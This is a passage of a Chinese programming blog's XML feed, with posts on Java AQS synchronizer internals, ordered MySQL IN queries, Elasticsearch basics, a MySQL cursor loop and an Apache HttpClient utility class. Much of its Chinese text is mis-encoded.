setHead(Node node) {        //ËµãÁªôÂ§¥ÁªìÁÇπ        head = node;        node.thread = null;        node.prev = null;    }</code></pre><p>‰∏äËø∞‰ª£Á†Å‰∏ªË¶ÅÈÄªËæëÊòØ:È¶ñÂÖàË∞ÉÁî® <code>Ëá™ÂÆö‰πâÂêåÊ≠•Âô®ÂÆûÁé∞ÁöÑtryAcquire(int arg)</code><br>ÊñπÊ≥ï,ËØ•ÊñπÊ≥ï‰øùËØÅÁ∫øÁ®ãÂÆâÂÖ®ÁöÑËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ,Â¶ÇÊûúÂêåÊ≠•Áä∂ÊÄÅËé∑ÂèñÂ§±Ë¥•Â∞±ÊûÑÈÄ†‰∏Ä‰∏™ÂêåÊ≠•ËäÇÁÇπ(Áã¨Âç†ÂºèÁöÑNode.EXCLUSIVE,Âêå‰∏ÄÊó∂ÂàªÂè™Êúâ‰∏Ä‰∏™Á∫øÁ®ãËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅÊàêÂäü)Âπ∂ÈÄöËøáaddWriter(Node<br>node)ÊñπÊ≥ïÂ∞ÜËØ•ÁªìÁÇπÂä†ÂÖ•ÂêåÊ≠•ÈòüÂàóÂ∞æÈÉ®,ÊúÄÂêéË∞ÉÁî®acquireQueued(Node node,int<br>arg),‰ΩøÂæóËØ•ÁªìÁÇπ‰ª•Ê≠ªÂæ™ÁéØÊñπÂºèËé∑ÂèñÈÄöËøáÁä∂ÊÄÅ.ÊúÄÂêé,Â¶ÇÊûúËé∑Âèñ‰∏çÂà∞ÂêåÊ≠•Áä∂ÊÄÅ,Â∞±ÈòªÂ°ûÁªìÁÇπ‰∏≠ÁöÑÁ∫øÁ®ã,ËÄåË¢´ÈòªÂ°ûÁ∫øÁ®ãÁöÑÂî§ÈÜí‰∏ªË¶Å‰æùÈù†ÂâçÈ©±ÁªìÁÇπÁöÑÂá∫ÈòüÊàñÈòªÂ°ûÁ∫øÁ®ãË¢´‰∏≠Êñ≠Êù•ÂÆûÁé∞.<br><em>ÂèØ‰ª•ÁúãÂá∫,enq(final Node node)ÊñπÊ≥ïÂ∞ÜÂπ∂ÂèëÊ∑ªÂä†ÂèäËØ∂Âà∞Âì™ ÁöÑËØ∑Ê±ÇÈÄöËøáCASÂèòÂæó‚Äù‚Äù‰∏≤Ë°åÂåñ</em></p><p>Áî±‰∫éÈùûÈ¶ñËäÇÁÇπÁ∫øÁ®ãÂâçÈ©±ÁªìÁÇπÂá∫ÈòüÊàñËÄÖË¢´‰∏≠Êñ≠ËÄå‰ªéÁ≠âÂæÖÁä∂ÊÄÅËøîÂõû,ÈöèÂêéÊ£ÄÊü•Ëá™Â∑±ÁöÑÂâçÈ©±ÊòØÂê¶ÊòØÂ§¥ÁªìÁÇπ,Â¶ÇÊûúÊòØÂ∞±Â∞ùËØïËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ.<br><em>ÂèØ‰ª•ÁúãÂá∫,ËäÇÁÇπÂíåËäÇÁÇπ‰πãÈó¥Âú®Âæ™ÁéØÊ£ÄÊü•‰∏≠ÊòØ‰∫íÁõ∏‰∏çÈÄö‰ø°ÁöÑ,ËÄåÊ≠£ÊòØÊ£ÄÊü•Ëá™Â∑±ÁöÑÂâçÈ©±ÊòØÂê¶ÊòØÂ§¥ÁªìÁÇπ,ËøôÊ†∑Â∞±ÂèØ‰ª•‰ΩøÂæóËäÇÁÇπÁöÑÈáäÊîæËßÑÂàôÁ¨¶ÂêàFIFO,Âπ∂‰∏î‰πü‰æø‰∫éÂØπËøáÊó©ÈÄöÁü•ÁöÑÂ§ÑÁêÜ(ËøáÊó©ÈÄöÁü•ÊòØÊåáÂâçÈ©±ËäÇÁÇπ‰∏çÊòØÂ§¥ÁªìÁÇπÁöÑÁ∫øÁ®ãÁî±‰∫éÁªàÁ´ØË¢´Âî§ÈÜí)</em></p><h5 id="ÂêåÊ≠•Âô®releaseÊñπÊ≥ï"><a href="#ÂêåÊ≠•Âô®releaseÊñπÊ≥ï" class="headerlink" title="ÂêåÊ≠•Âô®releaseÊñπÊ≥ï"></a>ÂêåÊ≠•Âô®releaseÊñπÊ≥ï</h5><pre><code>public final boolean release(int arg) {      if (tryRelease(arg)) {          Node h = head;          if (h != null &amp;&amp; h.waitStatus != 0)              unparkSuccessor(h);          return true;      }      return false;  }  private void unparkSuccessor(Node node) {      /*           * If status is negative (i.e., possibly needing signal) try           * to clear in anticipation of signalling.  It is OK if this           * fails or if status is changed by waiting thread.           */      int ws = node.waitStatus;      if (ws &lt; 0)          compareAndSetWaitStatus(node, ws, 0);      /*           * Thread to unpark is held in successor, which is normally           * just the next node.  But if cancelled or apparently null,           * traverse backwards from tail to find the actual           * non-cancelled successor.           */      Node s = node.next;      if (s == null || s.waitStatus &gt; 0) {          s = null;          for (Node t = tail; t != null &amp;&amp; t != node; t = t.prev)              if (t.waitStatus &lt;= 0)                  s = t;      }      if (s != null)          LockSupport.unpark(s.thread);  }</code></pre><p>ÂΩìÂâçÁ∫øÁ®ãËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅÂπ∂ÊâßË°åÁõ∏Â∫îÈÄªËæë‰πãÂêé,Â∞±ÈúÄË¶ÅÈáäÊîæÂêåÊ≠•ÊñπÊ≥ï,‰ΩøÂæóÂêéÁª≠ËäÇÁÇπËÉΩÂ§üÁªßÁª≠Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ.ÈÄöËøáË∞ÉÁî®ÂêåÊ≠•Âô®ÁöÑ <code>relase(int arg)</code><br>ÊñπÊ≥ïÂèØ‰ª•ÈáäÊîæÂêåÊ≠•Áä∂ÊÄÅ,ËØ•ÊñπÊ≥ïÂú®ÈáäÊîæ‰∫ÜÂêåÊ≠•Áä∂ÊÄÅ‰πãÂêé,‰ºöÂî§ÈÜíÂÖ∂ÂêéÁª≠ËäÇÁÇπ.</p><p>ÂàÜÊûê‰∫ÜÁã¨Âç†ÂºèÂêåÊ≠•Áä∂ÊÄÅËé∑ÂèñÂíåÈáäÊîæËøáÁ®ãÂêéÔºåÈÄÇÂΩìÂÅö‰∏™ÊÄªÁªìÔºöÂú®Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅÊó∂ÔºåÂêåÊ≠•Âô®Áª¥Êä§‰∏Ä‰∏™ÂêåÊ≠•ÈòüÂàóÔºåËé∑ÂèñÁä∂ÊÄÅÂ§±Ë¥•ÁöÑÁ∫øÁ®ãÈÉΩ‰ºöË¢´Âä†ÂÖ•Âà∞ÈòüÂàó‰∏≠Âπ∂Âú®ÈòüÂàó‰∏≠ËøõË°åËá™ÊóãÔºõÁßªÂá∫ÈòüÂàóÔºàÊàñÂÅúÊ≠¢Ëá™ÊóãÔºâÁöÑÊù°‰ª∂ÊòØÂâçÈ©±ËäÇÁÇπ‰∏∫Â§¥ËäÇÁÇπ‰∏îÊàêÂäüËé∑Âèñ‰∫ÜÂêåÊ≠•Áä∂ÊÄÅ„ÄÇÂú®ÈáäÊîæÂêåÊ≠•Áä∂ÊÄÅÊó∂ÔºåÂêåÊ≠•Âô®Ë∞ÉÁî®<br><code>tryRelease(int arg)</code> ÊñπÊ≥ïÈáäÊîæÂêåÊ≠•Áä∂ÊÄÅÔºåÁÑ∂ÂêéÂî§ÈÜíÂ§¥ËäÇÁÇπÁöÑÂêéÁªßËäÇÁÇπ„ÄÇ</p><h4 id="ÂÖ±‰∫´Âºè"><a href="#ÂÖ±‰∫´Âºè" class="headerlink" title="ÂÖ±‰∫´Âºè"></a>ÂÖ±‰∫´Âºè</h4><h5 id="Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ-1"><a href="#Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ-1" class="headerlink" title="Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ"></a>Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ</h5><pre><code>public final void acquireShared(int arg) {        if (tryAcquireShared(arg) &lt; 0)            doAcquireShared(arg);    }    private void doAcquireShared(int arg) {        final Node node = addWaiter(Node.SHARED);        boolean failed = true;        try {            boolean interrupted = false;            for (;;) {                final Node p = node.predecessor();                if (p == head) {                    int r = tryAcquireShared(arg);                    if (r &gt;= 0) {                        setHeadAndPropagate(node, r);                        p.next = null; // help GC                        if (interrupted)                            selfInterrupt();                        failed = false;                        return;                    }                }                if (shouldParkAfterFailedAcquire(p, node) &amp;&amp;                    parkAndCheckInterrupt())                    interrupted = true;            }        } finally {            if (failed)                cancelAcquire(node);        }    }</code></pre><p>Âú® <code>acquireShared(int arg)</code> ÊñπÊ≥ï‰∏≠ÔºåÂêåÊ≠•Âô®Ë∞ÉÁî®tryAcquireShared(int arg)ÊñπÊ≥ïÂ∞ùËØïËé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅÔºå <code>tryAcquireShared(int arg)</code><br>ËøîÂõûÂÄºÊòØintÁ±ªÂûãÔºå‰ΩÜËøîÂõûÂÄºÂ§ß‰∫é0Â∞±‰ª£Ë°®ÂèØ‰ª•Ëé∑ÂèñÂêåÊ≠•Áä∂ÊÄÅ„ÄÇÂõ†Ê≠§Âú®ÂÖ±‰∫´ÂºèËé∑ÂèñÁöÑËá™ÊóãËøáÁ®ã‰∏≠ÔºåÊàêÂäüËé∑ÂèñÂà∞ÂêåÊ≠•Áä∂ÊÄÅÂπ∂ÈÄÄÂá∫Ëá™ÊóãÁöÑÊù°‰ª∂Â∞±ÊòØtryAcquireShared(int<br>arg)Â§ß‰∫éÁ≠â‰∫é0</p><h5 id="ÈáäÊîæÂêåÊ≠•Áä∂ÊÄÅ"><a href="#ÈáäÊîæÂêåÊ≠•Áä∂ÊÄÅ" class="headerlink" title="ÈáäÊîæÂêåÊ≠•Áä∂ÊÄÅ"></a>ÈáäÊîæÂêåÊ≠•Áä∂ÊÄÅ</h5><pre><code>public final boolean releaseShared(int arg) {        if (tryReleaseShared(arg)) {            doReleaseShared();            return true;        }        return false;    }</code></pre><p>ÈáäÊîæÂêåÊ≠•Áä∂ÊÄÅ‰∏ÄËà¨ÊòØÈÄöËøáÂæ™ÁéØÂíåcasÊù•‰øùËØÅÔºåÂõ†‰∏∫ÈáäÊîæÂêåÊ≠•Áä∂ÊÄÅÁöÑÊìç‰Ωú‰ºöÂêåÊó∂Êù•Ëá™Â§ö‰∏™Á∫øÁ®ã„ÄÇ</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂπ∂Âèë </tag>
            
            <tag> aqs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql inÊúâÂ∫èÊü•ËØ¢</title>
      <link href="/2019/09/19/mysql%20in%E6%9C%89%E5%BA%8F%E6%9F%A5%E8%AF%A2/"/>
      <url>/2019/09/19/mysql%20in%E6%9C%89%E5%BA%8F%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<pre><code>select * from hair_system_hairstyle where id in (24,23,25)</code></pre><p><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373853.68189451056.png" alt="ÊåâidÈ°∫Â∫èÊü•ËØ¢"></p><h3 id="Â¶ÇÊûúÊÉ≥Ë¶ÅÊü•ËØ¢Ê†πÊçÆ-24-23-25È°∫Â∫è"><a href="#Â¶ÇÊûúÊÉ≥Ë¶ÅÊü•ËØ¢Ê†πÊçÆ-24-23-25È°∫Â∫è" class="headerlink" title="Â¶ÇÊûúÊÉ≥Ë¶ÅÊü•ËØ¢Ê†πÊçÆ,24,23,25È°∫Â∫è"></a>Â¶ÇÊûúÊÉ≥Ë¶ÅÊü•ËØ¢Ê†πÊçÆ,24,23,25È°∫Â∫è</h3><pre><code>select * from hair_system_hairstyle where id in (24,23,25) order by field(id,24,23,25)</code></pre><p>ÊïàÊûú<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373853.8537593915.png" alt="ÊéíÂ∫èÁöÑ"></p>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elasticsearchÂü∫Á°ÄÁØá</title>
      <link href="/2019/09/18/elasticsearch%E5%9F%BA%E7%A1%80%E7%AF%87/"/>
      <url>/2019/09/18/elasticsearch%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂÆâË£Ö"><a href="#ÂÆâË£Ö" class="headerlink" title="ÂÆâË£Ö"></a>ÂÆâË£Ö</h3><p>ÂÆâË£ÖelasticSearchÂíåkibana</p><h3 id="ÁÆÄÂçïÂ∫îÁî®"><a href="#ÁÆÄÂçïÂ∫îÁî®" class="headerlink" title="ÁÆÄÂçïÂ∫îÁî®"></a>ÁÆÄÂçïÂ∫îÁî®</h3><p>‰∏Ä‰∏™ElasticsearchÈõÜÁæ§ÂèØ‰ª•ÂåÖÂê´Â§ö‰∏™Á¥¢Âºï(index),Áõ∏Â∫îÁöÑÊØè‰∏™Á¥¢ÂºïÂèØ‰ª•ÂåÖÂê´Â§ö‰∏™Á±ªÂûã(type).Ëøô‰∫õ‰∏çÂêåÁöÑÁ±ªÂûãÂ≠òÂÇ®ÁùÄÂ§ö‰∏™ÊñáÊ°£,ÊØè‰∏™ÊñáÊ°£ÂèàÊúâÂ§ö‰∏™Â±ûÊÄß</p><h4 id="ÊîæÂÖ•‰ø°ÊÅØ"><a href="#ÊîæÂÖ•‰ø°ÊÅØ" class="headerlink" title="ÊîæÂÖ•‰ø°ÊÅØ"></a>ÊîæÂÖ•‰ø°ÊÅØ</h4><pre><code>PUT /megacorp/employee/1{    &quot;first_name&quot; : &quot;John&quot;,    &quot;last_name&quot; :  &quot;Smith&quot;,    &quot;age&quot; :        25,    &quot;about&quot; :      &quot;I love to go rock climbing&quot;,    &quot;interests&quot;: [ &quot;sports&quot;, &quot;music&quot; ]}PUT /megacorp/employee/2{    &quot;first_name&quot; :  &quot;Jane&quot;,    &quot;last_name&quot; :   &quot;Smith&quot;,    &quot;age&quot; :         32,    &quot;about&quot; :       &quot;I like to collect rock albums&quot;,    &quot;interests&quot;:  [ &quot;music&quot; ]}PUT /megacorp/employee/3{    &quot;first_name&quot; :  &quot;Douglas&quot;,    &quot;last_name&quot; :   &quot;Fir&quot;,    &quot;age&quot; :         35,    &quot;about&quot;:        &quot;I like to build cabinets&quot;,    &quot;interests&quot;:  [ &quot;forestry&quot; ]}</code></pre><p>ÂÖ∂‰∏≠ <code>megacorp</code> Á¥¢ÂºïÂêçÁß∞, <code>employee</code> Á±ªÂûãÂêçÁß∞, <code>1</code> ÊòØÁâπÂÆöÈõáÂëòÁöÑID</p><h4 id="Ê£ÄÁ¥¢Âçï‰∏™ÈõáÂëò"><a href="#Ê£ÄÁ¥¢Âçï‰∏™ÈõáÂëò" class="headerlink" title="Ê£ÄÁ¥¢Âçï‰∏™ÈõáÂëò"></a>Ê£ÄÁ¥¢Âçï‰∏™ÈõáÂëò</h4><pre><code>GET /megacorp/employee/1ËøîÂõûÂÄº,{  &quot;_index&quot;: &quot;megacorp&quot;,  &quot;_type&quot;: &quot;employee&quot;,  &quot;_id&quot;: &quot;1&quot;,  &quot;_version&quot;: 1,  &quot;found&quot;: true,  &quot;_source&quot;: {    &quot;first_name&quot;: &quot;John&quot;,    &quot;last_name&quot;: &quot;Smith&quot;,    &quot;age&quot;: 25,    &quot;about&quot;: &quot;I love to go rock climbing&quot;,    &quot;interests&quot;: [      &quot;sports&quot;,      &quot;music&quot;    ]  }}</code></pre><h4 id="ËΩªÈáèÊêúÁ¥†"><a href="#ËΩªÈáèÊêúÁ¥†" class="headerlink" title="ËΩªÈáèÊêúÁ¥†"></a>ËΩªÈáèÊêúÁ¥†</h4><p>Ëé∑ÂèñÊâÄÊúâÈõáÂëò</p><pre><code>GET /megacorp/employee/_search</code></pre><p>Êü•ËØ¢Â≠óÁ¨¶‰∏≤</p><pre><code>GET /megacorp/employee/_search?q=last_name:smithÁªìÊûú{  &quot;took&quot;: 110,  &quot;timed_out&quot;: false,  &quot;_shards&quot;: {    &quot;total&quot;: 5,    &quot;successful&quot;: 5,    &quot;skipped&quot;: 0,    &quot;failed&quot;: 0  },  &quot;hits&quot;: {    &quot;total&quot;: 2,    &quot;max_score&quot;: 0.2876821,    &quot;hits&quot;: [      {        &quot;_index&quot;: &quot;megacorp&quot;,        &quot;_type&quot;: &quot;employee&quot;,        &quot;_id&quot;: &quot;2&quot;,        &quot;_score&quot;: 0.2876821,        &quot;_source&quot;: {          &quot;first_name&quot;: &quot;Jane&quot;,          &quot;last_name&quot;: &quot;Smith&quot;,          &quot;age&quot;: 32,          &quot;about&quot;: &quot;I like to collect rock albums&quot;,          &quot;interests&quot;: [            &quot;music&quot;          ]        }      },      {        &quot;_index&quot;: &quot;megacorp&quot;,        &quot;_type&quot;: &quot;employee&quot;,        &quot;_id&quot;: &quot;1&quot;,        &quot;_score&quot;: 0.2876821,        &quot;_source&quot;: {          &quot;first_name&quot;: &quot;John&quot;,          &quot;last_name&quot;: &quot;Smith&quot;,          &quot;age&quot;: 25,          &quot;about&quot;: &quot;I love to go rock climbing&quot;,          &quot;interests&quot;: [            &quot;sports&quot;,            &quot;music&quot;          ]        }      }    ]  }}</code></pre><p>Êü•ËØ¢ÁöÑÊó∂ÂÄô,‰ºöÂèëÁé∞,ÁúüÂÆûÊï∞ÊçÆ‰∏≠last_nameÊòØSimth,ÈÉΩÊü•ËØ¢Âá∫Êù•‰∫Ü,‰ΩÜÊòØÊúâ _scoreËøô‰∏™Ê†áÁ≠æ,<br>_scoreÊòØ‰∏ÄÁßçÁ°ÆÂÆöÂåπÈÖç‰∏éÊü•ËØ¢ÁöÑÁõ∏ÂÖ≥Á®ãÂ∫¶ÁöÑÊñπÊ≥ï.</p><h4 id="‰ΩøÁî®Êü•ËØ¢Ë°®ËææÂºèÊêúÁ¥†"><a href="#‰ΩøÁî®Êü•ËØ¢Ë°®ËææÂºèÊêúÁ¥†" class="headerlink" title="‰ΩøÁî®Êü•ËØ¢Ë°®ËææÂºèÊêúÁ¥†"></a>‰ΩøÁî®Êü•ËØ¢Ë°®ËææÂºèÊêúÁ¥†</h4><pre><code>GET /megacorp/employee/_search{  &quot;query&quot;: {    &quot;match&quot;: {      &quot;last_name&quot;: &quot;smith&quot;    }  }}</code></pre><p>ÂèØ‰ª•ÂèëÁé∞,Âíå‰∏äÈù¢ÁöÑÊü•ËØ¢ÊòØ‰∏ÄÊ†∑ÁöÑ</p><h4 id="Â§çÊùÇÁöÑÊêúÁ¥¢"><a href="#Â§çÊùÇÁöÑÊêúÁ¥¢" class="headerlink" title="Â§çÊùÇÁöÑÊêúÁ¥¢"></a>Â§çÊùÇÁöÑÊêúÁ¥¢</h4><pre><code>GET /megacorp/employee/_search{    &quot;query&quot; : {        &quot;bool&quot;: {            &quot;must&quot;: {                &quot;match&quot; : {                    &quot;last_name&quot; : &quot;smith&quot;                 }            },            &quot;filter&quot;: {                &quot;range&quot; : {                    &quot;age&quot; : { &quot;gt&quot; : 30 }                 }            }        }    }}</code></pre><p>ÊêúÁ¥¢ÊúÄÂêé‰∏Ä‰∏™ÂêçÂ≠óÊòØsmithÁöÑ,Âπ∂ËøáÊª§ÂÖ∂‰∏≠Âπ¥ÈæÑÂ§ß‰∫é30Â≤ÅÁöÑ</p><h4 id="ÂÖ®ÊñáÊêúÁ¥¢"><a href="#ÂÖ®ÊñáÊêúÁ¥¢" class="headerlink" title="ÂÖ®ÊñáÊêúÁ¥¢"></a>ÂÖ®ÊñáÊêúÁ¥¢</h4><pre><code>GET /megacorp/employee/_search{  &quot;query&quot;:{    &quot;match&quot;:{      &quot;about&quot;: &quot;rock climbing&quot;    }  }}</code></pre><p>ÂèØ‰ª•ÊâæÂà∞‰∏§Êù°,ÂÖ∂‰∏≠‰∏ÄÊù°Êï∞ÊçÆÊòØ <code>&quot;about&quot;: &quot;I love to go rock climbing&quot;</code> ËøòÊúâ‰∏ÄÊù°ÊòØ <code>&quot;about&quot;: &quot;Ilike to collect rock albums&quot;</code> ‰∏∫‰ªÄ‰πàÁ¨¨‰∫åÊù°‰πüÊúâÂë¢,Âõ†‰∏∫ÊèêÂà∞‰∫Ürock,Âè™ÊòØ_scoreÁõ∏Â∫îÁöÑ‰Ωé‰∫Ü‰∏ÄÁÇπ</p><h4 id="Áü≠ËØ≠Êü•Êâæ"><a href="#Áü≠ËØ≠Êü•Êâæ" class="headerlink" title="Áü≠ËØ≠Êü•Êâæ"></a>Áü≠ËØ≠Êü•Êâæ</h4><pre><code>GET /megacorp/employee/_search{  &quot;query&quot;:{    &quot;match_phrase&quot;: {      &quot;about&quot;: &quot;rock climbing&quot;    }  }}</code></pre><p>ÂèØ‰ª•Á≤æÁ°ÆÊü•Êâæ</p>]]></content>
      
      
      
        <tags>
            
            <tag> elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql loop</title>
      <link href="/2019/09/17/mysql%20loop/"/>
      <url>/2019/09/17/mysql%20loop/</url>
      
        <content type="html"><![CDATA[<h2 id="mysql‰∏≠Âæ™ÁéØ-Êü•ÊâæÂπ∂ÊèíÂÖ•Êï∞ÊçÆ"><a href="#mysql‰∏≠Âæ™ÁéØ-Êü•ÊâæÂπ∂ÊèíÂÖ•Êï∞ÊçÆ" class="headerlink" title="mysql‰∏≠Âæ™ÁéØ,Êü•ÊâæÂπ∂ÊèíÂÖ•Êï∞ÊçÆ"></a>mysql‰∏≠Âæ™ÁéØ,Êü•ÊâæÂπ∂ÊèíÂÖ•Êï∞ÊçÆ</h2><pre><code>DELIMITER //DROP PROCEDURE IF EXISTS doWhile;CREATE PROCEDURE doWhile()  BEGIN    DECLARE hair_id VARCHAR(300);        DECLARE sortx INT DEFAULT 0;        DECLARE review_id INT;    DECLARE cursor1 CURSOR FOR (SELECT system_hairstyle_id,sortx FROM hair_system WHERE status = 1);        set review_id = 99;    OPEN cursor1;    read_loop: LOOP      FETCH FROM cursor1 INTO hair_id,sortx;      INSERT INTO hair_store (review_id,system_hairstyle_id,sort,status) VALUE (review_id, hair_id,sortx,1);    END LOOP;    CLOSE cursor1;  END;//CALL doWhile();</code></pre><blockquote><p>ËøôÂè•ËØ≠Âè•ÊòØÊòØÂÆö‰πâ‰∫ÜÈÉ®ÂàÜÂèòÈáè,Âπ∂‰ªécursor‰∏≠ËØªÂèñ‰ø°ÊÅØ,Âπ∂Â∞ÜÁõ∏Â∫î‰ø°ÊÅØÊîæÂÖ•Âà∞Êñ∞Ë°®‰∏≠<br> [ Êù•Ê∫ê ](<a href="https://pritomkumar.blogspot.com/2017/06/mysql-insert-with-while-" target="_blank" rel="noopener">https://pritomkumar.blogspot.com/2017/06/mysql-insert-with-while-</a><br>loop-use-loop.html)</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> mysql loop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>httpClientÂ∑•ÂÖ∑Á±ª</title>
      <link href="/2019/09/05/httpClient%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
      <url>/2019/09/05/httpClient%E5%B7%A5%E5%85%B7%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h3 id="httpClientÂ∑•ÂÖ∑Á±ª"><a href="#httpClientÂ∑•ÂÖ∑Á±ª" class="headerlink" title="httpClientÂ∑•ÂÖ∑Á±ª"></a>httpClientÂ∑•ÂÖ∑Á±ª</h3><h4 id="pomÈÖçÁΩÆ"><a href="#pomÈÖçÁΩÆ" class="headerlink" title="pomÈÖçÁΩÆ"></a>pomÈÖçÁΩÆ</h4><pre><code>&lt;!-- apache httpclientÁªÑ‰ª∂ start--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;    &lt;artifactId&gt;httpclient&lt;/artifactId&gt;     &lt;version&gt;4.5.5&lt;/version&gt;&lt;/dependency&gt;&lt;!-- apache httpclientÁªÑ‰ª∂ end--&gt;&lt;!-- fastjson --&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;fastjson&lt;/artifactId&gt;    &lt;version&gt;1.2.58&lt;/version&gt;&lt;/dependency&gt;&lt;!-- fastjson END --&gt;</code></pre><h4 id="Â∑•ÂÖ∑ÂåÖ"><a href="#Â∑•ÂÖ∑ÂåÖ" class="headerlink" title="Â∑•ÂÖ∑ÂåÖ"></a>Â∑•ÂÖ∑ÂåÖ</h4><pre><code>import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;import org.apache.http.NameValuePair;import org.apache.http.client.config.RequestConfig;import org.apache.http.client.entity.UrlEncodedFormEntity;import org.apache.http.client.methods.*;import org.apache.http.client.utils.URIBuilder;import org.apache.http.entity.StringEntity;import org.apache.http.impl.client.CloseableHttpClient;import org.apache.http.impl.client.HttpClients;import org.apache.http.message.BasicNameValuePair;import org.apache.http.util.EntityUtils;import java.io.IOException;import java.io.UnsupportedEncodingException;import java.net.URI;import java.util.ArrayList;import java.util.List;import java.util.Map;import java.util.Set;/** * Description:httpclientÂ∑•ÂÖ∑Á±ª * @author husky * @date 2019/9/5 11:35 */public class HttpClientUtil {    /**     * ENCODING ÁºñÁ†ÅÊ†ºÂºè„ÄÇÂèëÈÄÅÁºñÁ†ÅÊ†ºÂºèÁªü‰∏ÄÁî®UTF-8     * */    private static final String ENCODING = &quot;UTF-8&quot;;    /**     * CONNECT_TIMEOUT ËÆæÁΩÆËøûÊé•Ë∂ÖÊó∂Êó∂Èó¥ÔºåÂçï‰ΩçÊØ´Áßí„ÄÇ     * */    private static final int CONNECT_TIMEOUT = 6000;    /**     * SOCKET_TIMEOUT ËØ∑Ê±ÇËé∑ÂèñÊï∞ÊçÆÁöÑË∂ÖÊó∂Êó∂Èó¥(Âç≥ÂìçÂ∫îÊó∂Èó¥)ÔºåÂçï‰ΩçÊØ´Áßí„ÄÇ     */    private static final int SOCKET_TIMEOUT = 6000;    /**     * ÂèëÈÄÅgetËØ∑Ê±Ç:Â∏¶ËØ∑Ê±ÇÂ§¥ÂíåËØ∑Ê±ÇÂèÇÊï∞     * @param url ËØ∑Ê±ÇÂú∞ÂùÄ     * @param headers ËØ∑Ê±ÇÂ§¥     * @param params ËØ∑Ê±ÇÂèÇÊï∞ÈõÜÂêà     * @return JSONObject     * @throws Exception     */    public static JSONObject doGet(String url, Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params) throws Exception {        //ÂàõÂª∫httpClientÂØπË±°        CloseableHttpClient httpClient = HttpClients.createDefault();        URIBuilder uriBuilder = new URIBuilder(url);        if (params != null) {            Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = params.entrySet();            for (Map.Entry&lt;String, String&gt; entry : entrySet) {                uriBuilder.setParameter(entry.getKey(), entry.getValue());            }        }        URI uri = uriBuilder.build();        HttpGet httpGet = new HttpGet(uri);        //ËÆæÁΩÆÂèÇÊï∞        httpGet.setConfig(RequestConfig.custom().setConnectTimeout(CONNECT_TIMEOUT).setSocketTimeout(SOCKET_TIMEOUT).build());        //ËÆæÁΩÆËØ∑Ê±ÇÂ§¥        packageHeader(headers,httpGet);        CloseableHttpResponse httpResponse = null;        try {            return getResponse(httpResponse,httpClient,httpGet);        }finally {            release(httpResponse,httpClient);        }    }    /**     * description Ë°®ÂçïÊñπÂºèÁöÑpost     * @param url ËØ∑Ê±ÇÂú∞ÂùÄ     * @param headers ËØ∑Ê±ÇÂ§¥     * @param params ËØ∑Ê±ÇÂèÇÊï∞     * @return JSONObject     * @throws Exception     */    public static JSONObject doFormPost(String url,Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params) throws Exception{        // ÂàõÂª∫httpClientÂØπË±°        CloseableHttpClient httpClient = HttpClients.createDefault();        // ÂàõÂª∫httpÂØπË±°        HttpPost httpPost = new HttpPost(url);        httpPost.setConfig(RequestConfig.custom().setConnectTimeout(CONNECT_TIMEOUT).setSocketTimeout(SOCKET_TIMEOUT).build());        //Â∞ÅË£ÖËØ∑Ê±ÇÂèÇÊï∞        packageHeader(headers,httpPost);        //Â∞ÅË£ÖËØ∑Ê±ÇÂ§¥        packageFormParam(params,httpPost);        CloseableHttpResponse httpResponse = null;        try{            return getResponse(httpResponse,httpClient,httpPost);        }finally {            release(httpResponse,httpClient);        }    }    /**     * description Ë°®ÂçïÊñπÂºèÁöÑpost     * @param url ËØ∑Ê±ÇÂ§¥     * @param headers ËØ∑Ê±ÇÂ§¥     * @param params ËØ∑Ê±ÇÂèÇÊï∞     * @return JSONObject     * @throws Exception     */    public static JSONObject doJsonPost(String url,Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params) throws Exception{        // ÂàõÂª∫httpClientÂØπË±°        CloseableHttpClient httpClient = HttpClients.createDefault();        // ÂàõÂª∫httpÂØπË±°        HttpPost httpPost = new HttpPost(url);        httpPost.setConfig(RequestConfig.custom().setConnectTimeout(CONNECT_TIMEOUT).setSocketTimeout(SOCKET_TIMEOUT).build());        //Â∞ÅË£ÖËØ∑Ê±ÇÂèÇÊï∞        packageHeader(headers,httpPost);        //Â∞ÅË£ÖËØ∑Ê±ÇÂ§¥        packageJsonParam(params,httpPost);        CloseableHttpResponse httpResponse = null;        try{            return getResponse(httpResponse,httpClient,httpPost);        }finally {            release(httpResponse,httpClient);        }    }    /**     * Description: Â∞ÅË£ÖËØ∑Ê±ÇÂ§¥     * @param params     * @param httpMethod     */    public static void packageHeader(Map&lt;String, String&gt; params, HttpRequestBase httpMethod) {        // Â∞ÅË£ÖËØ∑Ê±ÇÂ§¥        if (params != null) {            Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = params.entrySet();            for (Map.Entry&lt;String, String&gt; entry : entrySet) 